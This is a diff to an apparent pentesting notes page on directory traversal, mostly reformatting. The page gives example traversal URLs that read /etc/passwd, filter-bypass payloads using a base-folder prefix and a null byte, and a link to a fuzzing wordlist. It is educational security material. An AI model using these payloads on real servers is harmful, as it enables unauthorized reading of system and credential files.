@@ -2,10 +2,15 @@
 
 ## <mark style="color:yellow;">General info</mark>
 
-* `<img src="/loadImage?filename=218.png">`
-* An attacker can request the following URL to retrieve the `/etc/passwd` file from the server's filesystem
-* `https://insecure-website.com/loadImage?filename=../../../etc/passwd`
-* On Windows, both `../` and `..\` are valid directory traversal sequences
+Consider
+
+```html
+<img src="/loadImage?filename=218.png">
+```
+
+An attacker can request the following URL to retrieve the `/etc/passwd` file from the server's filesystem.
+
+`https://insecure-website.com/loadImage?filename=../../../etc/passwd`
 
 ## <mark style="color:yellow;">Bypass defences</mark>
 
@@ -17,6 +22,10 @@
 * Require to start with the expected base folder es. `/var/www/images` -> `filename=/var/www/images/../../../etc/passwd`
 * Require to end with an expected file extension es. `.png` -> `filename=../../../etc/passwd%00.png`
 * Others
+
+{% hint style="info" %}
+**Note**: On Windows, both `../` and `..\` are valid directory traversal sequences.
+{% endhint %}
 
 ## <mark style="color:yellow;">Tips</mark>
 
@@ -30,4 +39,4 @@
 
 ## <mark style="color:yellow;">Automatic exploitation</mark>
 
-Use intruder with this list: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/deep\_traversal.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/deep\_traversal.txt)&#x20;
+Use intruder with this list: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/deep\_traversal.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/deep_traversal.txt)&#x20;
